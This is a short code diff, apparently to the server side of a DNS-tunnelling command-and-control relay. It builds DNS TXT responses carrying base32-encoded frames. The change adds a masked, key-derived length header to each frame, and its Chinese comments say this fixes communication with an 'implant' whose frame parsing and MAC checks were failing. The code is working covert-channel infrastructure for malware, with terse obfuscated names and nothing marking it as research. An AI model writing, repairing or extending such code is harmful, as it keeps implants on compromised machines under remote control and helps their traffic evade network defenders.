@@ -59,7 +59,13 @@ def _btxt(qid,labels,qtype,chunks):
   rd=bytes([len(ch)])+ch
   ans+=(b"\\xc0\\x0c"+_st.pack(">HHI",16,1,60)+_st.pack(">H",len(rd))+rd)
  return hdr+qname+_st.pack(">HH",qtype,1)+ans
+def _hd(f):
+ return _st.pack(">I", len(f) ^ int.from_bytes(h.sha256(_AK + b"len").digest()[:4], "big")) + f
 def _txtresp(qid,labels,qtype,frame,bid):
+ # 帧须带 4 字节掩码长度头(与 relay_code 的 S 同构): implant 端 recv_frame
+ # 第一步就读掩码头再按长度取帧体——裸 E() 密文会被当头解析,长度错乱
+ # MAC 必败,整条 DNS 中继不可用(2026-09-04 修复)
+ frame=_hd(frame)
  b32=_b32e(frame)
  chunks=[b32[i:i+60] for i in range(0,len(b32),60)]
  if bid and len(chunks)>40:
